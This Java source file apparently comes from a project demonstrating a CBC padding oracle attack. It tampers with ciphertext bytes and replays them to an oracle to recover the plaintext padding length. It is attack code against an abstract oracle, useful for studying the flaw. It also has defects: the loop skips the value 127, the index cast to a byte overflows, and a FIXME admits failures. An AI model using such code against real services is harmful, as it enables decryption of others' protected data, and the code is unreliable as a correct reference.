package name.neuhalfen.padding_oracle.attack;

import name.neuhalfen.padding_oracle.CipherText;
import name.neuhalfen.padding_oracle.oracle.PaddingOracle;

import java.security.GeneralSecurityException;

public class FindPadding {

    public byte guessPaddingLen(PaddingOracle oracle) throws GeneralSecurityException {

        final CipherText cipherText = oracle.interceptCipherText();
        byte[] ciphertext = cipherText.ciphertext;

        // last byte of block cn-1
        byte Cn_1Idx = (byte) (ciphertext.length - oracle.getBlockLengthInBytes() - 1);
        byte Cn_1 = ciphertext[Cn_1Idx];

        // force padding to 0x01
        byte Pn_dash = 0x1;
        byte Cn_1_dash = findCn_1_dash(oracle, Cn_1Idx, (CipherText) cipherText.clone());

        byte Pn_star = (byte) (Pn_dash ^ Cn_1_dash);
        byte Pn = (byte) (Pn_star ^ Cn_1);

        return Pn;
    }

    byte findCn_1_dash(PaddingOracle oracle, final byte Cn_1Idx, final CipherText tamperedCipherText) throws GeneralSecurityException {

        boolean hasHitGoodSignature = false;

        byte original_cn_1_dash = tamperedCipherText.ciphertext[Cn_1Idx];

        for (byte cn_1_dash = Byte.MIN_VALUE; cn_1_dash < Byte.MAX_VALUE; cn_1_dash++) {
            tamperedCipherText.ciphertext[Cn_1Idx] = cn_1_dash;

            switch (oracle.replayCiphertext(tamperedCipherText)) {
                case OK:
                    // we can ignore this, as this was the "original" content of the ciphertext
                    hasHitGoodSignature = true;
                    break;

                case PADDING_INVALID:
                    // failure: the decrypted last byte is not a valid padding
                    break;

                case MAC_INVALID:
                    // We have a valid padding, but not the original padding (--> that would be "MAC OK")
                    // the situation is the following:
                    // The last byte ('P[lastByteIdx]') of the (tampered) plaintext is 0x1 (a valid padding)
                    return cn_1_dash;
            }
        }

        // Unable to trigger a MAC_INVALID? --> The padding must have been correct
        if (hasHitGoodSignature) {
            return original_cn_1_dash;
        } else {
            // FIXME: In theory, this should never happen. But it does.
            throw new RuntimeException("Unable to get valid padding for index " + Cn_1Idx + "\nOracle: " + oracle.toString() + "\nTampered Ciphertext: " + tamperedCipherText.toString());
        }
    }

}
